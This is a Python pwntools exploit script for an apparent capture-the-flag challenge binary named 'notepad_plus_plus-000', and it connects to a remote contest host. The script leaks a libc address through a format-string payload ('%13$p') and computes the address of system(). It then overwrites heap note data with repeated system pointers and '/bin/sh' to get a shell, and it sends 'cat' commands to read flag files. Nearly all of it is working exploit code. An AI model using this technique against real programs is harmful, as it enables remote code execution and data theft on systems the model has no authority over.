#!/usr/bin/env python3

from pwn import *
import codecs
import warnings

if args.SWARM:
    context.log_level = "ERROR"

exe = ELF("./notepad_plus_plus-000_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]
warnings.filterwarnings("ignore", category=BytesWarning)

def debug():
    if args.GDB_DEBUG:
        gdb.attach(p, '''
        c
        ''')
        pause()

def conn():
    if args.LOCAL:
        p = process([exe.path])
    else:
        p = remote("notepad_plus_plus-000.cbc2025.cloud", 443, ssl=True)
    return p

def add_note(ind, nt, data):
    p.sendlineafter(">", "1")
    p.sendlineafter(":", str(ind))
    p.sendlineafter(":", str(nt))
    p.sendlineafter(":", data)

def print_note(ind):
    p.sendlineafter(">", "2")
    p.sendlineafter(":", str(ind))

def delete_note(ind):
    p.sendlineafter(">", "3")
    p.sendlineafter(":", str(ind))

p = conn()

add_note(0, 4, "%13$p")
print_note(0)
libc_leak = int(p.recvline(), 16)
print(hex(libc_leak))
libc_base = libc_leak - 0x2a1ca
system = libc_base + 0x58750
add_note(1, 1, "asdf")
delete_note(0)
add_note(0, 1, b"A"*8 + (p64(system) + b"/bin/sh\0")*12)
print_note(1)

if not args.SWARM:
    p.interactive()
else:
    # print out the flag to stdout
    p.sendline("cat ./flag*")
    p.sendline("cat /flag*")
    p.sendline("cat /home/*/flag*")
    print(p.recvall(timeout=3), flush=True)
